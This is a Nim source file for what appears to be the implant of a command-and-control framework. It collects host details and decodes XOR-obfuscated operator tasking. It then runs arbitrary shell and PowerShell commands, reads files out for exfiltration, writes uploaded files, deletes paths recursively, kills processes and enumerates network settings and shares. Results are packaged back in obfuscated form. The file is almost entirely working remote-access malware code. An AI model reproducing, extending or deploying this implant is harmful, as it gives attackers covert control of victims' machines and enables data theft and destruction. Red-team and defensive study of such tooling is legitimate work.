import json
import std/strutils
import os
import osproc
import std/base64
import std/random
import std/options
import std/algorithm
import system
import posix


proc toString*(str: seq[uint8]): string =
  result = newStringOfCap(len(str))
  for ch in str:
    add(result, char(ch))


proc xorEncode*(key, data: string): seq[uint8] =
  var result: seq[uint8]
  if key.len == 0:
    for ch in data:
      result.add(uint8(int(ch)))
    return result

  var j = 0
  for i in countup(0, data.len - 1):
    if j == key.len:
      j = 0
    result.add(uint8(int(data[i])) xor uint8(int(key[j])))
    inc j

  result

const
  instructionMsgTag* = "INS"
  uuidMsgTag* = "UID"
  cmdMsgTag* = "CM"
  returnValueTag* = "RV"
  inputFileTag* = "IF"
  outputFileTag* = "OF"
  dataTag* = "DA"
  argsTag* = "AR"
  pidTag* = "PI"
  errorCodeTag* = "EC"

  beaconHashMsgTag* = "BH"
  listenerHashMsgTag* = "LH"
  usernameMsgTag* = "UN"
  hostnameMsgTag* = "HN"
  archMsgTag* = "ARC"
  privilegeMsgTag* = "PR"
  osMsgTag* = "OS"
  lastProofOfLifeMsgTag* = "POF"
  sessionsMsgTag* = "SS"
  internalIpsMsgTag* = "IIPS"
  processIdMsgTag* = "PID"
  additionalInfoMsgTag* = "ADI"

  emptyString* = ""
  zeroString* = "0"
  alphabetChars* = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
  privilegeHigh* = "high"
  privilegeLow* = "low"
  okMessage* = "OK."
  fileExistsMessage* = "File already exists."
  fileDoesNotExistMessage* = "File doesn't exist."
  fileReadFailureMessage* = "Failed to read file"
  fileWriteFailureMessage* = "Failed to write file"
  changeDirFailureMessage* = "Failed to change directory"
  missingSleepValueMessage* = "Missing sleep value"
  invalidSleepValueMessage* = "Invalid sleep value"
  unknownInstructionMessage* = "Unknown instruction"
  moduleCommandNotRequiredMessage* = "Module commands are not required for this beacon"
  missingPathMessage* = "Missing path argument"
  missingFilePathMessage* = "Missing file path"
  missingCommandMessage* = "Missing command"
  operationNotSupportedMessage* = "Operation not supported on this platform"
  commandExecutionFailureMessage* = "Failed to execute command"
  killProcessFailureMessage* = "Failed to terminate process"
  invalidProcessIdMessage* = "Invalid process identifier"
  directoryCreationFailureMessage* = "Failed to create directory"
  removeFailureMessage* = "Failed to remove target"
  environmentVariableNotFoundMessage* = "Environment variable not found"
  treeGenerationFailureMessage* = "Failed to enumerate directory tree"
  quotedEmptyPath* = "\"\""
  doubleQuoteString* = "\""
  escapedDoubleQuoteString* = "\"\""

  instructionModuleCmd* = "modulecmd"
  instructionLs* = "ls"
  instructionListDirectory* = "listdirectory"
  instructionPs* = "ps"
  instructionListProcesses* = "listprocesses"
  instructionCd* = "cd"
  instructionChangeDirectory* = "changedirectory"
  instructionPwd* = "pwd"
  instructionPrintWorkingDirectory* = "printworkingdirectory"
  instructionDownload* = "download"
  instructionUpload* = "upload"
  instructionRun* = "run"
  instructionShell* = "shell"
  instructionPowershell* = "powershell"
  instructionSleep* = "sleep"
  instructionCat* = "cat"
  instructionMkDir* = "mkdir"
  instructionRemove* = "remove"
  instructionKillProcess* = "killprocess"
  instructionTree* = "tree"
  instructionGetEnv* = "getenv"
  instructionWhoami* = "whoami"
  instructionNetstat* = "netstat"
  instructionIpConfig* = "ipconfig"
  instructionEnumerateShares* = "enumerateshares"

when defined(windows):
  const
    shellExecutable* = "cmd.exe"
    shellFlag* = "/C"
    listDirectoryCommand* = "dir "
    processListCommand* = "tasklist"
else:
  const
    shellExecutable* = "bash"
    shellFlag* = "-c"
    listDirectoryCommand* = "ls -la "
    processListCommand* = "ps -aux"


type
  C2Message* = object
    instruction*: string
    cmd*: string
    returnValue*: string
    inputFile*: string
    outputFile*: string
    data*: string
    args*: string
    uuid*: string
    pid*: int
    errorCode*: Option[int]


type
    Beacon* = ref object of RootObj
        beaconHash*: string
        hostname*: string
        username*: string
        arch*: string
        privilege*: string
        os*: string
        listenerHash*: string
        lastProofOfLife*: string
        internalIps*: string
        processId*: string
        additionalInfo*: string
        sleepTimeMs*: int
        xorKey*: string

        tasks: seq[C2Message]
        taskResults*: seq[C2Message]


proc initBeacon*(self: Beacon) =

    var alphabet = alphabetChars
    randomize()
    var hash = emptyString
    for i in 0..32-1:
        hash = hash & alphabet[rand(len(alphabet)-1)]

    self.beaconHash = hash
    const size = 256

    let hostname = newString(size)
    var success = gethostname(hostname, size) == 0
    let nullPos = hostname.find('\0')
    self.hostname = hostname
    if nullPos != -1:
        let finalHostname = hostname.substr(0, nullPos - 1)
        self.hostname = finalHostname

    var uid = geteuid()
    var gid = getegid()

    var login: cstring
    login = getlogin()
    
    self.username = $login
    self.arch = hostCPU
    if gid==0 or uid==0:
        self.privilege = privilegeHigh
    else:
        self.privilege = privilegeLow
    self.os = hostOS
    self.sleepTimeMs = 1000
    self.listenerHash = emptyString
    self.lastProofOfLife = zeroString
    self.internalIps = emptyString
    self.processId = $getpid()
    self.additionalInfo = emptyString
    self.xorKey = emptyString
    self.tasks = @[]
    self.taskResults = @[]


proc encodeString(data: string): string =
  if data.len == 0:
    return emptyString
  encode(data.toOpenArrayByte(0, data.high))


proc decodeString(data: string): string =
  if data.len == 0:
    return emptyString
  try:
    return decode(data)
  except CatchableError:
    return emptyString


proc quotePathForShell(path: string): string =
  when defined(windows):
    if path.len == 0:
      return quotedEmptyPath
    result = doubleQuoteString
    for ch in path:
      if ch == '"':
        result.add(escapedDoubleQuoteString)
      else:
        result.add(ch)
    result.add(doubleQuoteString)
  else:
    result = quoteShell(path)


proc execShellCommand(command: string): string =
  if command.len == 0:
    return emptyString
  try:
    result = execProcess(shellExecutable, args=[shellFlag, command], options={poUsePath})
  except OSError:
    result = commandExecutionFailureMessage


proc buildCommand(cmd, args: string): string =
  if cmd.len == 0:
    return args
  if args.len == 0:
    return cmd
  cmd & " " & args


proc normalizePath(path: string): string =
  if path.len == 0:
    return path
  try:
    result = absolutePath(path)
  except OSError:
    result = path


proc handleModuleCommand(): string =
  moduleCommandNotRequiredMessage


proc handleChangeDirectory(path: string): string =
  if path.len == 0:
    return missingPathMessage
  try:
    setCurrentDir(path)
    return getCurrentDir()
  except OSError:
    return changeDirFailureMessage


proc handleListDirectory(path: string): string =
  var target = path
  if target.len == 0:
    target = getCurrentDir()
  let safeCmd = quotePathForShell(target)
  execShellCommand(listDirectoryCommand & safeCmd)


proc handleListProcesses(): string =
  execShellCommand(processListCommand)


proc readFileContents(path: string, data: var string): string =
  data = emptyString
  if path.len == 0:
    return missingFilePathMessage
  if not fileExists(path):
    return fileDoesNotExistMessage
  try:
    var fileHandler = open(path, fmRead)
    data = fileHandler.readAll()
    fileHandler.close()
    okMessage
  except IOError:
    fileReadFailureMessage


proc handleDownload(path: string, data: var string): string =
  readFileContents(path, data)


proc handleUpload(path, content: string): string =
  if path.len == 0:
    return missingFilePathMessage
  if fileExists(path):
    return fileExistsMessage
  try:
    var fileHandler = open(path, fmWrite)
    fileHandler.write(content)
    fileHandler.close()
    okMessage
  except IOError:
    fileWriteFailureMessage


proc handleRun(command: string): string =
  if command.len == 0:
    return missingCommandMessage
  execShellCommand(command)


proc handlePowershell(command: string): string =
  if command.len == 0:
    return missingCommandMessage
  when defined(windows):
    try:
      execProcess("powershell", args=["-NoLogo", "-NoProfile", "-NonInteractive", "-Command", command], options={poUsePath})
    except OSError:
      commandExecutionFailureMessage
  else:
    operationNotSupportedMessage


proc handlePrintWorkingDirectory(): string =
  getCurrentDir()


proc handleCat(path: string): string =
  var content = emptyString
  let status = readFileContents(path, content)
  if status == okMessage:
    return content
  status


proc handleMkDir(path: string): string =
  if path.len == 0:
    return missingPathMessage
  if dirExists(path):
    return okMessage
  try:
    createDir(path)
    okMessage
  except OSError:
    directoryCreationFailureMessage


proc removePathRecursively(path: string): bool =
  if fileExists(path) or symlinkExists(path):
    try:
      removeFile(path)
      return true
    except OSError:
      return false
  if dirExists(path):
    var success = true
    try:
      for kind, entryPath in walkDir(path):
        if kind in {pcDir, pcLinkToDir}:
          if not removePathRecursively(entryPath):
            success = false
        else:
          try:
            removeFile(entryPath)
          except OSError:
            success = false
      removeDir(path)
    except OSError:
      success = false
    return success
  false


proc handleRemove(path: string): string =
  if path.len == 0:
    return missingPathMessage
  if not (fileExists(path) or dirExists(path) or symlinkExists(path)):
    return fileDoesNotExistMessage
  if removePathRecursively(path):
    okMessage
  else:
    removeFailureMessage


proc handleKillProcess(pidValue: string): string =
  if pidValue.len == 0:
    return invalidProcessIdMessage
  var parsedPid: int
  try:
    parsedPid = parseInt(pidValue)
  except ValueError:
    return invalidProcessIdMessage
  when defined(windows):
    let command = "taskkill /PID " & $parsedPid & " /F"
    let output = execShellCommand(command)
    if output.len == 0:
      okMessage
    else:
      output
  else:
    if kill(parsedPid, SIGTERM) == 0 or kill(parsedPid, SIGKILL) == 0:
      okMessage
    else:
      killProcessFailureMessage


proc appendTree(path: string, prefix: string, result: var string) =
  var entries: seq[tuple[name: string, fullPath: string, isDir: bool]] = @[]
  try:
    for kind, entryPath in walkDir(path):
      let name = lastPathPart(entryPath)
      let isDir = kind == pcDir
      entries.add((name, entryPath, isDir))
  except OSError:
    result.add(prefix & treeGenerationFailureMessage & "\n")
    return
  sort(entries, proc(a, b: tuple[name: string, fullPath: string, isDir: bool]): int =
    cmp(a.name.toLowerAscii(), b.name.toLowerAscii())
  )
  for i, entry in entries:
    let isLast = i == entries.high
    let connector = if isLast: "└── " else: "├── "
    result.add(prefix & connector & entry.name & "\n")
    if entry.isDir:
      let childPrefix = prefix & (if isLast: "    " else: "│   ")
      appendTree(entry.fullPath, childPrefix, result)


proc handleTree(path: string): string =
  var target = path
  if target.len == 0:
    target = getCurrentDir()
  if dirExists(target):
    var result = normalizePath(target) & "\n"
    appendTree(target, emptyString, result)
    return result
  if fileExists(target):
    return normalizePath(target)
  fileDoesNotExistMessage


proc handleShell(command: string): string =
  handleRun(command)


proc handleGetEnv(name: string): string =
  let trimmed = name.strip()
  if trimmed.len == 0:
    return missingCommandMessage
  let value = getEnv(trimmed, emptyString)
  if value.len == 0:
    environmentVariableNotFoundMessage
  else:
    value


proc handleWhoami(): string =
  let output = execShellCommand("whoami")
  if output.len > 0:
    return output.strip()
  let candidates = ["USER", "USERNAME", "LOGNAME"]
  for name in candidates:
    let value = getEnv(name, emptyString)
    if value.len > 0:
      return value
  environmentVariableNotFoundMessage


proc handleNetstat(): string =
  execShellCommand("netstat -an")


proc handleIpConfig(): string =
  when defined(windows):
    execShellCommand("ipconfig /all")
  else:
    let output = execShellCommand("ip addr show")
    if output.len == 0:
      execShellCommand("ifconfig -a")
    else:
      output


proc handleEnumerateShares(): string =
  when defined(windows):
    execShellCommand("net share")
  else:
    operationNotSupportedMessage


proc cmdToTasks*(self: Beacon, input: string) =
  if isEmptyOrWhitespace(input):
    return

  var decoded: string
  try:
    decoded = decode(input)
  except CatchableError:
    return

  let transformed = xorEncode(self.xorKey, decoded)
  let payload = toString(transformed)

  var jsonNode: JsonNode
  try:
    jsonNode = parseJson(payload)
  except JsonParsingError:
    return

  if jsonNode.kind != JArray:
    return

  for bundleNode in jsonNode:
    if bundleNode.kind != JObject:
      continue

    if bundleNode.hasKey(listenerHashMsgTag):
      self.listenerHash = bundleNode[listenerHashMsgTag].getStr()
    if bundleNode.hasKey(usernameMsgTag):
      self.username = bundleNode[usernameMsgTag].getStr()
    if bundleNode.hasKey(hostnameMsgTag):
      self.hostname = bundleNode[hostnameMsgTag].getStr()
    if bundleNode.hasKey(archMsgTag):
      self.arch = bundleNode[archMsgTag].getStr()
    if bundleNode.hasKey(privilegeMsgTag):
      self.privilege = bundleNode[privilegeMsgTag].getStr()
    if bundleNode.hasKey(osMsgTag):
      self.os = bundleNode[osMsgTag].getStr()
    if bundleNode.hasKey(lastProofOfLifeMsgTag):
      self.lastProofOfLife = bundleNode[lastProofOfLifeMsgTag].getStr()
    if bundleNode.hasKey(internalIpsMsgTag):
      self.internalIps = bundleNode[internalIpsMsgTag].getStr()
    if bundleNode.hasKey(processIdMsgTag):
      self.processId = bundleNode[processIdMsgTag].getStr()
    if bundleNode.hasKey(additionalInfoMsgTag):
      self.additionalInfo = bundleNode[additionalInfoMsgTag].getStr()

    let beaconHash = if bundleNode.hasKey(beaconHashMsgTag): bundleNode[beaconHashMsgTag].getStr() else: emptyString
    if beaconHash != self.beaconHash:
      continue

    if not bundleNode.hasKey(sessionsMsgTag):
      continue

    let sessions = bundleNode[sessionsMsgTag]
    if sessions.kind != JArray:
      continue

    for sessionNode in sessions:
      if sessionNode.kind != JObject:
        continue

      var message = C2Message(pid: -100, errorCode: none(int))

      if sessionNode.hasKey(instructionMsgTag):
        message.instruction = sessionNode[instructionMsgTag].getStr()
      if sessionNode.hasKey(cmdMsgTag):
        message.cmd = sessionNode[cmdMsgTag].getStr()
      if sessionNode.hasKey(argsTag):
        message.args = sessionNode[argsTag].getStr()
      if sessionNode.hasKey(uuidMsgTag):
        message.uuid = sessionNode[uuidMsgTag].getStr()
      if sessionNode.hasKey(pidTag):
        message.pid = sessionNode[pidTag].getInt()
      if sessionNode.hasKey(errorCodeTag):
        message.errorCode = some(sessionNode[errorCodeTag].getInt())

      if sessionNode.hasKey(returnValueTag):
        message.returnValue = decodeString(sessionNode[returnValueTag].getStr())
      if sessionNode.hasKey(inputFileTag):
        message.inputFile = decodeString(sessionNode[inputFileTag].getStr())
      if sessionNode.hasKey(outputFileTag):
        message.outputFile = decodeString(sessionNode[outputFileTag].getStr())
      if sessionNode.hasKey(dataTag):
        message.data = decodeString(sessionNode[dataTag].getStr())

      self.tasks.add(message)


proc execInstruction*(self: Beacon) =
  for task in self.tasks:
    var instruction = task.instruction
    var args = task.args
    var cmd = task.cmd
    var data = task.data
    var inputFile = task.inputFile
    var outputFile = task.outputFile
    var pid = task.pid

    let normalizedInstruction = instruction.toLowerAscii()

    var result = emptyString
    case normalizedInstruction:
    of instructionModuleCmd:
      result = handleModuleCommand()
    of instructionLs, instructionListDirectory:
      result = handleListDirectory(if cmd.len > 0: cmd else: args)
    of instructionPs, instructionListProcesses:
      result = handleListProcesses()
    of instructionCd, instructionChangeDirectory:
      result = handleChangeDirectory(if cmd.len > 0: cmd else: args)
    of instructionPwd, instructionPrintWorkingDirectory:
      result = handlePrintWorkingDirectory()
    of instructionDownload:
      let downloadPath =
        if inputFile.len > 0: inputFile
        elif cmd.len > 0: cmd
        else: args
      result = handleDownload(downloadPath, data)
    of instructionUpload:
      let uploadPath =
        if outputFile.len > 0: outputFile
        elif cmd.len > 0: cmd
        else: args
      result = handleUpload(uploadPath, data)
    of instructionRun:
      result = handleRun(buildCommand(cmd, args))
    of instructionShell:
      result = handleShell(buildCommand(cmd, args))
    of instructionPowershell:
      result = handlePowershell(if args.len > 0: args else: cmd)
    of instructionCat:
      let catPath = if cmd.len > 0: cmd elif inputFile.len > 0: inputFile else: args
      result = handleCat(catPath)
    of instructionMkDir:
      result = handleMkDir(if cmd.len > 0: cmd else: args)
    of instructionRemove:
      var target = if cmd.len > 0: cmd else: args
      if target.len == 0:
        target = if inputFile.len > 0: inputFile else: outputFile
      result = handleRemove(target)
    of instructionKillProcess:
      result = handleKillProcess(if cmd.len > 0: cmd else: args)
    of instructionTree:
      result = handleTree(if cmd.len > 0: cmd else: args)
    of instructionGetEnv:
      result = handleGetEnv(if cmd.len > 0: cmd else: args)
    of instructionWhoami:
      result = handleWhoami()
    of instructionNetstat:
      result = handleNetstat()
    of instructionIpConfig:
      result = handleIpConfig()
    of instructionEnumerateShares:
      result = handleEnumerateShares()
    of instructionSleep:
      let sleepValue = if cmd.len > 0: cmd else: args
      if not isEmptyOrWhitespace(sleepValue):
        try:
          self.sleepTimeMs = parseInt(sleepValue) * 1000
          result = okMessage
        except ValueError:
          result = invalidSleepValueMessage
      else:
        result = missingSleepValueMessage
    else:
      result = unknownInstructionMessage

    var taskResult = C2Message(
      instruction: instruction,
      cmd: cmd,
      args: args,
      data: data,
      inputFile: inputFile,
      outputFile: outputFile,
      pid: pid,
      uuid: task.uuid,
      returnValue: result,
      errorCode: none(int)
    )
    self.taskResults.add(taskResult)

  self.tasks.setLen(0)


proc taskResultsToCmd*(self: Beacon): string =
  var sessions = newJArray()

  for message in self.taskResults:
    var node = newJObject()
    if message.instruction.len > 0:
      node[instructionMsgTag] = %message.instruction
    if message.cmd.len > 0:
      node[cmdMsgTag] = %message.cmd
    if message.returnValue.len > 0:
      node[returnValueTag] = %encodeString(message.returnValue)
    if message.inputFile.len > 0:
      node[inputFileTag] = %encodeString(message.inputFile)
    if message.outputFile.len > 0:
      node[outputFileTag] = %encodeString(message.outputFile)
    if message.data.len > 0:
      node[dataTag] = %encodeString(message.data)
    if message.args.len > 0:
      node[argsTag] = %message.args
    if message.pid != -100:
      node[pidTag] = %message.pid
    if message.errorCode.isSome:
      node[errorCodeTag] = %message.errorCode.get()
    if message.uuid.len > 0:
      node[uuidMsgTag] = %message.uuid

    sessions.add(node)

  var bundle = newJObject()
  if self.beaconHash.len > 0:
    bundle[beaconHashMsgTag] = %self.beaconHash
  if self.listenerHash.len > 0:
    bundle[listenerHashMsgTag] = %self.listenerHash
  if self.username.len > 0:
    bundle[usernameMsgTag] = %self.username
  if self.hostname.len > 0:
    bundle[hostnameMsgTag] = %self.hostname
  if self.arch.len > 0:
    bundle[archMsgTag] = %self.arch
  if self.privilege.len > 0:
    bundle[privilegeMsgTag] = %self.privilege
  if self.os.len > 0:
    bundle[osMsgTag] = %self.os
  if self.lastProofOfLife.len > 0:
    bundle[lastProofOfLifeMsgTag] = %self.lastProofOfLife
  if self.internalIps.len > 0:
    bundle[internalIpsMsgTag] = %self.internalIps
  if self.processId.len > 0:
    bundle[processIdMsgTag] = %self.processId
  if self.additionalInfo.len > 0:
    bundle[additionalInfoMsgTag] = %self.additionalInfo
  if sessions.len > 0:
    bundle[sessionsMsgTag] = sessions

  var multi = newJArray()
  multi.add(bundle)

  let serialized = $multi
  let encrypted = xorEncode(self.xorKey, serialized)
  let encoded = encode(encrypted)

  self.taskResults.setLen(0)

  encoded
